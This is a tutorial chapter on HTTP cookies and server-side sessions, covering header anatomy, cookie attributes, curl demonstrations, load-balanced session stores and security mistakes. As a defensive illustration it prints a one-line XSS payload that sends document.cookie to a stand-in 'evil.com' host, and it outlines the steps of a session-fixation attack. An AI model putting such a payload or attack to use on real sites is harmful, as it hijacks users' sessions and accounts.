# 19 — Cookies and Sessions over the Wire

> **Phase 3 — Topic 6 of 7**
> Prerequisites: `01-how-the-internet-works.md`, `14-http-headers-in-depth.md`, `16-authentication-over-http.md`

---

## ELI5 — The Simple Analogy

Imagine you walk into a coffee shop for the first time. The barista has never seen you and has no memory of you. You order, you pay, you leave.

The next day you come back. The barista has *still* forgotten you completely — because this barista wakes up with amnesia after every single customer. That's HTTP. Every request is a total stranger walking in the door.

Now imagine the shop hands you a small paper ticket on your first visit:

```
┌───────────────────────┐
│  LOYALTY CARD         │
│  member #48213        │
│  keep this with you   │
└───────────────────────┘
```

Every time you come back, you show the ticket. The barista reads the number, looks it up in a binder behind the counter, and says "Ah, member 48213 — the usual oat-milk latte, you have 3 stamps." The barista *still* has amnesia — but the **ticket** carries your identity, and the **binder** holds your history.

- The **ticket** you carry = a **cookie**. The shop gave it to you (`Set-Cookie`), and you present it every visit (`Cookie:`).
- The **binder behind the counter** = the **session store** on the server.
- The **member number** on the ticket = the **session ID**.

The whole trick of cookies and sessions is turning an amnesiac protocol into one that remembers who you are — without the server having to trust anything the ticket *claims*, only the number it carries.

---

## Where This Lives in the Network Stack

Cookies are pure **Layer 7 (Application)**. They are nothing more than two HTTP headers — `Set-Cookie` going down, `Cookie` coming back up. They ride inside HTTP, which rides inside TLS, TCP, and IP like everything else.

```
┌─────────────────────────────────────────────────────────────────┐
│  Layer 7 — Application   (HTTP)                                  │
│     ├─ Set-Cookie: header  (server → browser)   ◄── COOKIES     │
│     └─ Cookie: header      (browser → server)   ◄── LIVE HERE   │
│  Layer 6 — Presentation  (TLS — the `Secure` attribute needs it)│
│  Layer 5 — Session       (NOT this "session" — different concept)│
│  Layer 4 — Transport     (TCP — the connection carrying HTTP)    │
│  Layer 3 — Network       (IP)                                    │
└─────────────────────────────────────────────────────────────────┘
```

Two warnings about naming:

1. **The OSI "Session Layer" (Layer 5) has nothing to do with web sessions.** A web session is an application-level concept built on cookies. Don't confuse them.
2. **Cookies are managed by the HTTP *client*** (the browser, or `curl`, or your `fetch` library), not by the OS or the network. Routers, load balancers, and TCP know nothing about cookies unless they're specifically parsing HTTP (an L7 load balancer might — see Topic 28).

---

## What Is This?

**HTTP is stateless.** The protocol itself has no concept of "the same user made these two requests." Each request/response is independent. This is a *feature* — it makes HTTP simple, cacheable, and horizontally scalable. But it's a problem the moment you want a user to "log in" and stay logged in.

A **cookie** is a small piece of named data that the server asks the browser to store and send back on future requests. It's how you bolt state onto a stateless protocol.

- The server sends `Set-Cookie: session=abc123` in a **response**.
- The browser stores it.
- On every subsequent request to that site, the browser automatically adds `Cookie: session=abc123`.

A **session** is a server-side concept built *on top of* cookies: the server keeps the real data (who you are, your cart, your permissions) in its own storage, and the cookie only carries a meaningless **session ID** that points to it.

```
COOKIE          = the data the browser stores + resends (client-side)
SESSION ID      = one specific cookie value that identifies a server session
SESSION (store) = the actual state, kept server-side (RAM / Redis / DB)
```

The round trip in one picture:

```
  ┌──────────┐                                          ┌──────────┐
  │ BROWSER  │                                          │  SERVER  │
  └────┬─────┘                                          └────┬─────┘
       │  POST /login  (username + password)                 │
       │ ──────────────────────────────────────────────────►│
       │                                                     │ verify creds
       │                                                     │ create session
       │                                                     │ store server-side
       │  200 OK                                             │
       │  Set-Cookie: session=abc123; HttpOnly; Secure       │
       │ ◄──────────────────────────────────────────────────│
       │                                                     │
   [browser stores the cookie in its cookie jar]             │
       │                                                     │
       │  GET /account                                       │
       │  Cookie: session=abc123     ◄── sent automatically  │
       │ ──────────────────────────────────────────────────►│
       │                                                     │ look up abc123
       │                                                     │ → "this is Alice"
       │  200 OK  { "name": "Alice", ... }                   │
       │ ◄──────────────────────────────────────────────────│
       └─────────────────────────────────────────────────────┘
```

---

## Why Does It Matter for a Backend Developer?

Cookies and sessions are the machinery behind *every login you have ever built or used*. If you get them wrong, you get one of the most common and most severe classes of production bugs and security holes:

- **"The login doesn't stick."** User logs in, gets bounced back to the login page on the next click. This is almost always a cookie attribute mismatch (`Domain`, `Path`, `Secure`, `SameSite`) — and it's maddening to debug without knowing exactly what's on the wire.
- **Session hijacking / account takeover.** A stolen cookie *is* the user. No password needed. Getting `HttpOnly`, `Secure`, and `SameSite` right is the difference between "attacker needs the password" and "attacker owns the account."
- **CSRF (Cross-Site Request Forgery).** Because browsers send cookies *automatically*, a malicious site can trigger authenticated actions on your site unless you defend it. `SameSite` and CSRF tokens are your defense.
- **Sessions that don't scale.** In-memory sessions work perfectly on your laptop and fall apart the instant you run two server instances behind a load balancer. This is a rite-of-passage outage.
- **Bloated requests.** Cookies are sent on *every* request to your domain. A 3KB cookie means 3KB of upload on every image, every API call, every asset. People accidentally do this constantly.

You cannot design authentication, debug a login, or scale a stateful service without knowing precisely what `Set-Cookie` puts on the wire. This topic is that knowledge.

---

## The Packet/Protocol Anatomy

Cookies are two plain-text HTTP headers. Here is what they actually look like on the wire.

### The response direction: `Set-Cookie`

The server can send **multiple** `Set-Cookie` headers in one response — one per cookie. Each is a name/value pair followed by semicolon-separated attributes.

```
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=abc123def456; Domain=myapp.com; Path=/; Max-Age=3600; Secure; HttpOnly; SameSite=Lax
Set-Cookie: theme=dark; Path=/; Max-Age=31536000
Set-Cookie: csrf=9f8a7b6c; Path=/; Secure; SameSite=Strict
│           │       │       └──────────────── attributes (semicolon-separated) ─────────────┘
│           │       └── value
│           └── name
└── one header per cookie
```

Anatomy of a single `Set-Cookie`:

```
Set-Cookie: session = abc123def456 ; Domain=myapp.com ; Path=/ ; Max-Age=3600 ; Secure ; HttpOnly ; SameSite=Lax
            └──┬──┘   └────┬─────┘   └──────┬──────┘   └──┬─┘   └────┬────┘   └──┬─┘  └───┬───┘  └────┬─────┘
             NAME       VALUE           scope: domain   scope:   lifetime    HTTPS-  JS-can't  cross-site
                                                        path                 only    read it   rule
```

### The request direction: `Cookie`

The browser sends back **one** `Cookie` header containing **all** matching cookies, separated by `; ` — with **no attributes**, just names and values. The browser strips every attribute; the server never sees `Domain`, `Path`, `HttpOnly`, etc. on the way back.

```
GET /account HTTP/1.1
Host: myapp.com
Cookie: session=abc123def456; theme=dark; csrf=9f8a7b6c
        └──────────┬──────────┘  └───┬────┘  └────┬─────┘
         cookie 1              cookie 2       cookie 3
        (all matching cookies in ONE header, semicolon-space separated)
```

### The critical asymmetry

```
┌────────────────────────┬──────────────────────────────────────────┐
│ Set-Cookie (response)  │ Cookie (request)                         │
├────────────────────────┼──────────────────────────────────────────┤
│ ONE header per cookie  │ ONE header, ALL cookies                  │
│ Has attributes         │ NO attributes — just name=value pairs    │
│ Server → Browser       │ Browser → Server                         │
│ Says "store this"      │ Says "here's what I stored for you"      │
└────────────────────────┴──────────────────────────────────────────┘
```

The attributes exist **only to instruct the browser** about storage and sending rules. They are never transmitted back. This is why the server must re-declare them every time it wants to change or delete a cookie.

Both headers ride at Layer 7 inside the HTTP message, which over HTTPS is encrypted by TLS in transit (Topic 09). Over plain HTTP the cookie is readable by anyone on the path — which is exactly what the `Secure` attribute prevents.

---

## How It Works — Step by Step

Let's trace a full login-and-browse cycle and see exactly what each attribute does.

### Step 1 — Server decides to set a cookie

The user POSTs valid credentials. The server verifies them, generates a session, and builds a `Set-Cookie` header.

```
Server generates a cryptographically-random session ID:
    crypto.randomBytes(32).toString('hex')  →  "3f9c1e...a7"  (256 bits)

Server stores the real data server-side, keyed by that ID:
    redis> SET session:3f9c1e...a7 '{"userId":48213,"role":"user"}' EX 3600

Server tells the browser to hold the ID:
    Set-Cookie: sid=3f9c1e...a7; Path=/; Max-Age=3600; Secure; HttpOnly; SameSite=Lax
```

### Step 2 — Browser stores the cookie in its "cookie jar"

The browser parses the `Set-Cookie` header and records an entry keyed by **(domain, path, name)**:

```
COOKIE JAR (conceptual)
┌────────────┬──────┬──────┬─────────┬────────┬──────────┬──────────┬──────────┐
│ Domain     │ Path │ Name │ Value   │ Secure │ HttpOnly │ SameSite │ Expires  │
├────────────┼──────┼──────┼─────────┼────────┼──────────┼──────────┼──────────┤
│ myapp.com  │ /    │ sid  │ 3f9c... │ true   │ true     │ Lax      │ +3600s   │
└────────────┴──────┴──────┴─────────┴────────┴──────────┴──────────┴──────────┘
```

Because there was no `Domain` attribute, this is a **host-only** cookie: it will be sent **only** to exactly `myapp.com`, not to `api.myapp.com` (more on this below).

### Step 3 — Browser decides whether to resend on the next request

Before every outgoing request, the browser walks its jar and includes a cookie **only if ALL of these match**:

```
Outgoing request:  GET https://myapp.com/account

For each stored cookie, send it ONLY IF:
  ✓ Domain matches      → request host is myapp.com (or subdomain if Domain was set)
  ✓ Path matches        → request path /account starts with the cookie's Path (/)
  ✓ Secure satisfied    → cookie is Secure AND request is https:// (it is)
  ✓ Not expired         → now < Expires / within Max-Age window
  ✓ SameSite satisfied  → this is a same-site request, or the rule allows it
  ✓ HttpOnly is IRRELEVANT to sending — it only blocks JavaScript reads

All match → attach:  Cookie: sid=3f9c1e...a7
```

### Step 4 — Server validates the session ID

```
Request arrives:  Cookie: sid=3f9c1e...a7

Server:
  1. Extract sid from the Cookie header
  2. Look it up:  redis> GET session:3f9c1e...a7
  3a. Found & not expired → load {"userId":48213} → user is authenticated
  3b. Not found / expired  → treat as anonymous → 401 or redirect to /login
```

Note the server **never trusts the cookie's *content*** for identity — the ID is an opaque random pointer. All the authority lives in the server-side store. This is the whole security model: even if an attacker changes the cookie value, they'd have to *guess a valid 256-bit random ID*, which is infeasible.

### Step 5 — Session lifecycle

```
CREATE   login succeeds → generate new ID → store data → Set-Cookie
VALIDATE each request   → look up ID → confirm exists & not expired
RENEW    (sliding)      → on activity, extend expiry: redis> EXPIRE session:.. 3600
                          and optionally re-send Set-Cookie with fresh Max-Age
EXPIRE   TTL passes     → store auto-deletes → next request is anonymous
DESTROY  logout         → redis> DEL session:.. AND Set-Cookie: sid=; Max-Age=0
                          (delete server-side AND tell browser to drop the cookie)
```

### Step 6 — Deleting a cookie

There is no "delete cookie" instruction. You delete a cookie by **re-setting it with an expiry in the past** (or `Max-Age=0`), using the **same Name, Domain, and Path**:

```
Set-Cookie: sid=; Path=/; Max-Age=0
                          └────┬────┘
                    browser sees "already expired" → removes it from the jar
```

If the `Path` or `Domain` don't match the original, the browser creates/expires a *different* cookie and the original survives — a classic "logout doesn't log out" bug.

---

## Exact Syntax Breakdown

### Every `Set-Cookie` attribute, in detail

```
Set-Cookie: Name=Value; Expires=...; Max-Age=...; Domain=...; Path=...; Secure; HttpOnly; SameSite=...
```

**`Name=Value`** — the only required part. `Value` is the payload the browser stores. Should be URL-encoded if it contains special characters (`;`, `,`, spaces, `=`). For sessions this is the opaque random ID.

**Lifetime — three mutually-informing forms:**

```
No Expires AND no Max-Age → SESSION COOKIE
      Lives only until the browser (or tab, depending) closes. In RAM.
      Use for: "log me out when I close the browser."

Expires=Wed, 09 Jul 2027 10:00:00 GMT → PERSISTENT, ABSOLUTE time
      Deleted at that exact wall-clock moment. Vulnerable to a wrong client clock.

Max-Age=3600 → PERSISTENT, RELATIVE seconds from receipt
      "Live 3600 seconds from now." Immune to clock skew. PREFERRED.
      Max-Age=0 (or negative) → delete immediately.

If BOTH Expires and Max-Age are present → Max-Age WINS (per spec).
```

**`Domain=` — controls WHICH hosts get the cookie:**

```
NO Domain attribute → HOST-ONLY cookie
      Sent ONLY to the exact host that set it.
      Set by app.myapp.com → sent ONLY to app.myapp.com.

Domain=myapp.com → DOMAIN cookie
      Sent to myapp.com AND every subdomain: api.myapp.com, app.myapp.com, ...
      (The leading dot ".myapp.com" is legacy syntax; modern browsers treat
       "Domain=myapp.com" the same as ".myapp.com" — both include subdomains.)

You CANNOT set a cookie for a domain you're not on, nor for a public suffix.
      app.myapp.com  CANNOT set  Domain=google.com   (rejected)
      anyone         CANNOT set  Domain=.com          (public-suffix rejected)
      app.myapp.com  CAN set     Domain=myapp.com     (a parent it belongs to)
```

Broadening `Domain` widens the **attack surface**: a domain cookie on `myapp.com` is sent to *every* subdomain, so a compromised or attacker-controlled `blog.myapp.com` now receives your session cookie. Keep it host-only unless you truly need cross-subdomain sharing.

**`Path=` — controls WHICH paths get the cookie:**

```
Path=/           → sent for every path on the host (the usual choice)
Path=/admin      → sent ONLY for /admin, /admin/*, /admin-tools...
                   (prefix match; note /admin also matches /administrator —
                    it's a string prefix, not a directory boundary in older rules;
                    modern browsers match on path segments: /admin matches
                    /admin and /admin/... but NOT /administrator)
```

Path is **not a security boundary** — it's a scoping/optimization convenience. Don't rely on it to hide cookies; any page on the host can navigate to the path.

**`Secure`** — a flag (no value). The cookie is sent **only over HTTPS**. Prevents it leaking over plaintext HTTP where anyone on the path (coffee-shop Wi-Fi, ISP, transparent proxy) could read it. Mandatory for anything sensitive.

**`HttpOnly`** — a flag. The cookie is **invisible to JavaScript** (`document.cookie` won't show it, JS can't read or write it). This is your primary defense against **XSS stealing session cookies**. It does *not* affect whether the cookie is sent — it only blocks script access.

**`SameSite=` — controls sending on CROSS-SITE requests (CSRF defense):**

```
SameSite=Strict → Never sent on ANY cross-site request, including top-level
                  navigation. Clicking a link from another site to yours
                  arrives with NO cookie (user looks logged out on arrival).
                  Strongest CSRF protection; can hurt UX.

SameSite=Lax    → Sent on cross-site TOP-LEVEL navigations that are "safe"
                  (GET, clicking a link). NOT sent on cross-site POST,
                  fetch(), XHR, iframes, or images. The modern browser DEFAULT.
                  Good balance for most session cookies.

SameSite=None   → Sent on ALL cross-site requests. REQUIRED for third-party
                  cookies (embeds, SSO iframes, cross-origin APIs).
                  ⚠ RULE: SameSite=None MUST be paired with Secure, or the
                  browser REJECTS the cookie entirely.
```

What counts as "same-site"? It's based on the **registrable domain** (eTLD+1), not the exact host. `app.myapp.com` and `api.myapp.com` are the *same site* (both `myapp.com`) but different *origins*. `myapp.com` and `evil.com` are different sites.

**Cookie name prefixes — browser-enforced hardening:**

```
__Secure-  prefix → browser REJECTS the cookie unless it has `Secure` AND
                    was set over HTTPS.
   Set-Cookie: __Secure-sid=abc; Secure; Path=/            ✓ accepted
   Set-Cookie: __Secure-sid=abc; Path=/                    ✗ rejected (no Secure)

__Host-    prefix → browser REJECTS unless: `Secure`, set over HTTPS,
                    `Path=/`, and NO `Domain` attribute (host-only).
                    The strongest lock: cannot be overwritten by a subdomain.
   Set-Cookie: __Host-sid=abc; Secure; Path=/              ✓ accepted
   Set-Cookie: __Host-sid=abc; Secure; Path=/; Domain=x    ✗ rejected (has Domain)
```

The prefixes are enforced by the browser at set-time, so an attacker on a subdomain cannot forge or overwrite a `__Host-` cookie. Use `__Host-` for session cookies whenever you don't need cross-subdomain sharing.

### curl cookie flags

```
curl -c cookiejar.txt URL     # -c = save received cookies to a jar file
curl -b cookiejar.txt URL     # -b = read cookies from the jar and SEND them
curl -b cookiejar.txt -c cookiejar.txt URL   # both: send old, save new
curl -b "sid=abc123" URL      # -b with name=value = send an inline cookie
curl -v URL                   # -v = show Set-Cookie (<) and Cookie (>) headers
```

The **jar file** (Netscape cookie format) looks like:

```
# Netscape HTTP Cookie File
# domain        flag   path  secure  expiry      name  value
myapp.com    FALSE    /     TRUE   1783939200   sid   3f9c1e...a7
     │         │      │      │          │         │      │
     │         │      │      │          │         │      └── value
     │         │      │      │          │         └── name
     │         │      │      │          └── expiry (unix epoch; 0 = session cookie)
     │         │      │      └── Secure flag (TRUE = HTTPS only)
     │         │      └── Path
     │         └── "include subdomains?" flag (TRUE for domain cookies)
     └── domain
```

A leading `#HttpOnly_` on a line marks a cookie as HttpOnly in the jar.

---

## Example 1 — Basic

Watch a cookie get set and resent using a public echo service and `curl`.

```bash
# 1. Ask the server to set a cookie, and SAVE it to a jar file
curl -c jar.txt "https://httpbin.org/cookies/set?flavor=chocolate" -v 2>&1 | grep -i "set-cookie"
```

Output:

```
< set-cookie: flavor=chocolate; Path=/
  │            │      │          └── attribute
  │            │      └── value
  │            └── name
  └── incoming response header
```

Now inspect the jar file the browser (curl) stored:

```bash
cat jar.txt
```

```
# Netscape HTTP Cookie File
# This file was generated by libcurl! Edit at your own risk.

httpbin.org   FALSE   /   FALSE   0   flavor   chocolate
     │          │     │     │     │      │         │
   domain    subdom? path secure expiry name    value
                                  (0 = session cookie, dies on "browser" close)
```

Now make a **second** request and hand the jar back with `-b`. curl will resend the cookie automatically:

```bash
# 2. Send the saved cookie back to the server
curl -b jar.txt "https://httpbin.org/cookies" -v 2>&1 | grep -iE "^> cookie|flavor"
```

Output:

```
> Cookie: flavor=chocolate          ← curl attached it automatically (outgoing >)
  {
    "cookies": {
      "flavor": "chocolate"         ← the server confirms it received it
    }
  }
```

That's the entire round trip: **`Set-Cookie` down → stored in the jar → `Cookie` back up.** A real browser does exactly this, automatically, on every request.

To prove `-b` with an inline value (no jar):

```bash
curl -b "flavor=vanilla; scoops=2" "https://httpbin.org/cookies"
# {"cookies": {"flavor": "vanilla", "scoops": "2"}}
# Note: multiple cookies in ONE Cookie header, "; "-separated — the wire format.
```

---

## Example 2 — Production Scenario: "The login doesn't stick"

**The situation.** You ship a new login. On staging (`http://localhost:3000`) it works perfectly. In production (`https://app.myapp.com`, with the API at `https://api.myapp.com`) users log in, get a 200, and are *immediately* bounced back to the login screen. The session cookie is set but never comes back. Three real bugs are hiding here. Let's diagnose each with `curl -v`.

### Symptom capture

```bash
# Log in and capture the Set-Cookie the API sends
curl -v -c jar.txt -X POST https://api.myapp.com/login \
  -H "Content-Type: application/json" \
  -d '{"user":"alice","pass":"hunter2"}' 2>&1 | grep -i set-cookie
```

```
< set-cookie: sid=3f9c1e...; Domain=api.myapp.com; Path=/; Secure; HttpOnly; SameSite=Strict
```

Then the follow-up request that *should* be authenticated:

```bash
curl -v -b jar.txt https://api.myapp.com/account 2>&1 | grep -iE "cookie|HTTP/"
# > (no Cookie header appears)  → 401 Unauthorized
```

The cookie is set but not sent back. Now the three root causes.

### Bug 1 — `Domain` / origin mismatch

The browser page is `app.myapp.com`, but the cookie was set with `Domain=api.myapp.com`. When the browser's JS at `app.myapp.com` calls `fetch("https://api.myapp.com/...")`, the cookie *is* scoped to `api.myapp.com`, so that part is fine — **but** the front-end `fetch` must opt in to sending cookies cross-origin:

```javascript
// ❌ Cookies NOT sent — fetch omits credentials cross-origin by default
fetch("https://api.myapp.com/account")

// ✅ Must explicitly include credentials
fetch("https://api.myapp.com/account", { credentials: "include" })
```

And the API must return CORS headers that *allow* credentials (see Topic 17):

```
Access-Control-Allow-Origin: https://app.myapp.com   (NOT "*", must be exact)
Access-Control-Allow-Credentials: true
```

### Bug 2 — `SameSite=Strict` blocks the cross-site request

`app.myapp.com` and `api.myapp.com` are the same *site* (both `myapp.com`), so `SameSite=Strict` is actually fine *here*. But suppose the API is `api.myvendor.com` (a different registrable domain). Then `app.myapp.com → api.myvendor.com` is **cross-site**, and:

```
SameSite=Strict → cookie NEVER sent cross-site → 401 forever
SameSite=Lax    → cookie sent on top-level GET navigation only,
                  NOT on fetch()/XHR/POST → still 401 for your API calls
SameSite=None    → cookie sent on cross-site fetch  ✓  (but REQUIRES Secure)
```

Fix for a genuinely cross-site API:

```
Set-Cookie: sid=3f9c1e...; Path=/; Secure; HttpOnly; SameSite=None
                                                      └──────┬─────┘
                                              required for cross-site fetch;
                                              browser rejects None without Secure
```

### Bug 3 — Missing `Secure` (or the reverse) between HTTP and HTTPS

On staging over `http://localhost` the cookie had no `Secure`, and it worked. In production the app is HTTPS. If your reverse proxy terminates TLS and forwards **plain HTTP** to your app, your framework may decide the connection is "not secure" and either:

- refuse to send a `Secure` cookie, or
- set a `Secure` cookie that the (correctly HTTPS) browser stores, but your app never sees it because it thinks it's on HTTP.

```bash
# Confirm the browser refuses to send a Secure cookie over http://
curl -v -b jar.txt http://api.myapp.com/account 2>&1 | grep -i cookie
# > (no Cookie header) — Secure cookie withheld over plaintext, correctly
```

Fixes:

```
1. Serve everything over HTTPS (you should anyway).
2. Tell your app it's behind a TLS-terminating proxy so it trusts
   X-Forwarded-Proto: https  (Express: app.set('trust proxy', 1)) — see Topic 29.
3. Then set:  Secure; HttpOnly; SameSite=Lax (or None if cross-site)
```

### The scaling twist — sessions behind a load balancer

Even after the cookie flows correctly, a second failure appears once you scale to two instances behind a load balancer (Topic 28):

```
        ┌──────────────┐
POST    │ Load Balancer│      Instance A (in-memory sessions)
/login ►│              ├────► { sid 3f9c... → Alice }   ◄── session created HERE
        │  round-robin │
GET     │              │      Instance B (in-memory sessions)
/account│              ├────► { }  ◄── NO record of 3f9c... → 401!
        └──────────────┘
```

The login hit Instance A (which stored the session in *its own RAM*); the next request round-robined to Instance B, which has never heard of `3f9c...`. The cookie is perfect — the **store** isn't shared.

Two production fixes:

```
Option 1 — Sticky sessions (LB pins a client to one instance via a cookie/IP)
   Simple, but breaks on instance restart/scale-in, and unbalances load.

Option 2 — Shared session store (Redis) ◄── the standard answer
   ┌──────────────┐   both instances read/write the SAME store
   │ Load Balancer│        ┌──────────┐
   ├──► Instance A ──┐     │  Redis   │  session:3f9c... → {"userId":48213}
   ├──► Instance B ──┼────►│ (shared) │
   └──────────────┘  ┘     └──────────┘
   Any instance can validate any session. Survives restarts. Scales cleanly.
```

**The lesson:** the cookie is only half the system. A session is a cookie *plus* a store — and the store must be reachable by every instance that might handle the request.

---

## Common Mistakes

### Mistake 1: No `HttpOnly` — session cookie readable by JavaScript
```
Set-Cookie: sid=3f9c1e...; Path=/; Secure          ← missing HttpOnly
```
**Root cause:** Any XSS on your page can run `document.cookie` and exfiltrate the session. One injected `<script>` = mass account takeover.
```javascript
// Attacker's injected payload:
new Image().src = "https://evil.com/steal?c=" + document.cookie;
```
**Fix:** Always set `HttpOnly` on session cookies. It won't stop XSS, but it stops XSS from *stealing the session*.
```
Set-Cookie: sid=3f9c1e...; Path=/; Secure; HttpOnly; SameSite=Lax
```

---

### Mistake 2: No `Secure` — session sent over plaintext HTTP
```
Set-Cookie: sid=3f9c1e...; Path=/; HttpOnly        ← missing Secure
```
**Root cause:** The cookie is sent on any `http://` request to the host — a downgrade, a mixed-content asset, an attacker forcing an HTTP navigation — and anyone on the network (open Wi-Fi, ISP, malicious proxy) reads it in cleartext. Session stolen.
**Fix:** Always set `Secure`. Serve only over HTTPS and redirect HTTP→HTTPS. Prefer the `__Secure-` or `__Host-` name prefix so the browser enforces it.
```
Set-Cookie: __Host-sid=3f9c1e...; Path=/; Secure; HttpOnly; SameSite=Lax
```

---

### Mistake 3: Wrong `SameSite` for the use case
```
Set-Cookie: sid=abc; SameSite=Strict     ← but you have a cross-site SSO redirect
Set-Cookie: sid=abc; SameSite=None        ← but you FORGOT Secure → REJECTED entirely
Set-Cookie: sid=abc                        ← no SameSite → browser defaults to Lax,
                                             which silently breaks cross-site fetch()
```
**Root cause:** `Strict` logs users out when they arrive from an external link; `None` without `Secure` is dropped on the floor by the browser; relying on the default `Lax` breaks legitimate cross-site API calls.
**Fix:** Match the attribute to the flow. Same-site app → `Lax` (or `Strict` for high-security). Genuinely cross-site (third-party embed, separate-domain API) → `None; Secure`. Never send `None` without `Secure`.

---

### Mistake 4: Over-broad `Domain` scope
```
Set-Cookie: sid=abc; Domain=myapp.com     ← set from app.myapp.com
```
**Root cause:** Now the session cookie is sent to `blog.myapp.com`, `docs.myapp.com`, `legacy.myapp.com`, and any user-content subdomain. Compromise or XSS on *any* of them leaks the session. You've widened the attack surface to every subdomain.
**Fix:** Omit `Domain` (host-only) unless you truly need cross-subdomain sessions. Use `__Host-` to force host-only and forbid `Domain` entirely.
```
Set-Cookie: __Host-sid=abc; Path=/; Secure; HttpOnly; SameSite=Lax   ← host-only, locked
```

---

### Mistake 5: Storing large data in cookies
```
Set-Cookie: user_profile={"name":"Alice","prefs":{...3KB of JSON...}}
```
**Root cause:** Cookies are capped (~4KB per cookie, ~50 per domain, ~180 total in most browsers). Worse, this cookie is uploaded on **every single request** to your domain — every API call, every image, every asset — inflating bandwidth and latency for data most requests don't use. Exceed the limit and the browser silently drops the cookie.
**Fix:** Store only a small opaque session ID (or a compact signed token) in the cookie. Keep the real data server-side (Redis/DB), keyed by that ID.

---

### Mistake 6: Not regenerating the session ID on login (session fixation)
```
1. Attacker visits your site anonymously, gets sid=VICTIM_KNOWN_123
2. Attacker tricks victim into using that same sid (via a link/set-cookie)
3. Victim logs in — server KEEPS the same sid and just marks it authenticated
4. Attacker still holds sid=VICTIM_KNOWN_123 → now an authenticated session. Taken over.
```
**Root cause:** Reusing the pre-login session ID after authentication lets an attacker who planted the ID ride the elevated session.
**Fix:** **Always generate a brand-new session ID at the moment of login** (and on privilege changes). Invalidate the old one.
```javascript
req.session.regenerate(() => {   // new ID, old one destroyed
  req.session.userId = user.id;
});
```

---

### Mistake 7: In-memory sessions that don't survive restarts or multiple instances
```javascript
const sessions = {};   // ← lives in one process's RAM
```
**Root cause:** Sessions vanish on every deploy/restart (everyone logged out) and aren't visible to other instances behind a load balancer (random 401s). Works on your laptop, fails in production.
**Fix:** Use a shared, persistent store (Redis is the default) so any instance can validate any session and sessions survive restarts. See Example 2 and Topic 28.

---

## Hands-On Proof

```bash
# 1. Watch Set-Cookie appear on the wire
curl -v "https://httpbin.org/cookies/set?token=abc123" 2>&1 | grep -i "set-cookie"
# < set-cookie: token=abc123; Path=/

# 2. Save cookies to a jar and read the raw Netscape format
curl -c jar.txt "https://httpbin.org/cookies/set?a=1&b=2" > /dev/null 2>&1
cat jar.txt          # see domain, path, secure flag, expiry, name, value columns

# 3. Send the jar back and confirm the server received all cookies
curl -b jar.txt "https://httpbin.org/cookies"
# {"cookies": {"a": "1", "b": "2"}}  ← both sent in ONE Cookie header

# 4. Prove multiple cookies collapse into a single Cookie header on the wire
curl -v -b "x=1; y=2; z=3" "https://httpbin.org/cookies" 2>&1 | grep -i "^> cookie"
# > Cookie: x=1; y=2; z=3

# 5. Prove a Secure cookie is withheld over plain HTTP
curl -c jar2.txt "https://httpbin.org/response-headers?Set-Cookie=s=1;%20Secure" >/dev/null 2>&1
curl -v -b jar2.txt "http://httpbin.org/cookies" 2>&1 | grep -i "^> cookie"   # (nothing)
curl -v -b jar2.txt "https://httpbin.org/cookies" 2>&1 | grep -i "^> cookie"  # sends it

# 6. See how a browser stores cookies — in your real browser DevTools:
#    Application ▸ Storage ▸ Cookies ▸ (your site)
#    Columns: Name, Value, Domain, Path, Expires, Size, HttpOnly, Secure, SameSite
#    Try document.cookie in the console — HttpOnly cookies will NOT appear (proof it works)

# 7. Delete a cookie by expiring it (Max-Age=0)
curl -v "https://httpbin.org/cookies/delete?token" 2>&1 | grep -i "set-cookie"
# < set-cookie: token=; expires=...(past)...; Max-Age=0; Path=/
```

---

## Practice Exercises

### Exercise 1 — Easy: Set, store, and resend a cookie by hand
```bash
# 1. Set a cookie and save the jar:
curl -c jar.txt "https://httpbin.org/cookies/set?session=mysession123" > /dev/null 2>&1

# 2. Open jar.txt and answer:
#    a. What domain is the cookie scoped to?
#    b. What is the expiry column value, and what does that number mean?
#    c. Is the Secure flag TRUE or FALSE? Why does that matter?

# 3. Send it back and confirm the server sees it:
curl -b jar.txt "https://httpbin.org/cookies"

# Question: In the raw Cookie header curl sent, were the cookie's attributes
# (Path, Secure, etc.) included? Run with -v to check. Why or why not?
```

### Exercise 2 — Medium: Diagnose a SameSite mismatch
```bash
# You have a front-end at https://shop.example.com and an API at
# https://api.partner.com (a DIFFERENT registrable domain). The API sets:
#   Set-Cookie: sid=abc; Secure; HttpOnly; SameSite=Lax
# Users log in but every subsequent fetch() to the API returns 401.

# 1. Is shop.example.com → api.partner.com same-site or cross-site? Explain using
#    the registrable-domain (eTLD+1) rule.
# 2. Why does SameSite=Lax cause the fetch() to arrive WITHOUT the cookie,
#    even though a plain link-click navigation WOULD carry it?
# 3. What single attribute change fixes it — and what OTHER attribute becomes
#    mandatory as a result? What happens if you forget that second attribute?
# 4. Bonus: what CORS response headers does the API also need for the browser
#    to send and accept credentialed requests? (cross-reference Topic 17)
```

### Exercise 3 — Hard: Design a secure session system and prove fixation defense
```
Design (on paper or in code) a login session for https://app.bank.com:

1. Write the EXACT Set-Cookie header you'd emit on successful login. Justify
   every attribute (name prefix, Path, Secure, HttpOnly, SameSite, lifetime).
   Why __Host- and not a plain name? Why not Domain=bank.com?

2. Describe where the session data lives and what the cookie value actually is.
   Why must the value be a high-entropy random ID and not, say, the user's email?

3. Session fixation: write the sequence of steps showing how an attacker exploits
   a server that REUSES the pre-login session ID. Then write the one-line fix and
   explain why regenerating the ID breaks the attack.

4. Logout: write the exact Set-Cookie header that deletes the cookie, AND state the
   server-side action that must accompany it. Why is deleting only the cookie (and
   not the server record) insufficient?

5. Scaling: you deploy 4 instances behind an L4 load balancer. Your sessions are
   in-memory. Describe the failure users see, and give the two standard fixes with
   their trade-offs. (cross-reference Topic 28)
```

---

## Mental Model Checkpoint

Answer from memory. If you can't, re-read the relevant section.

1. **HTTP is stateless. In one sentence, how do cookies add state, and what are the two header names involved (and their directions)?**

2. **A server sends 3 cookies in a response and the browser later sends all 3 back. How many `Set-Cookie` headers went down, and how many `Cookie` headers come back up? What happened to the attributes?**

3. **What is the exact difference between a host-only cookie and a domain cookie? Which one is `app.myapp.com` creating if it sends `Set-Cookie: sid=abc` with no `Domain` attribute, and which subdomains will receive it?**

4. **`Expires` vs `Max-Age` vs neither — describe what each produces, and which wins if both are present. Why is `Max-Age` generally preferred over `Expires`?**

5. **You set `SameSite=None` on a cookie and the browser silently refuses to store it. What single required attribute is missing, and what class of use case forces you to use `None` in the first place?**

6. **A session cookie carries a random ID, not the user's data. Where does the real data live, and why does this design mean an attacker changing the cookie value can't impersonate anyone?**

7. **Two fixes for "login works on one instance but randomly 401s behind a load balancer." Name both and give one trade-off of each. Separately: why must you regenerate the session ID on login?**
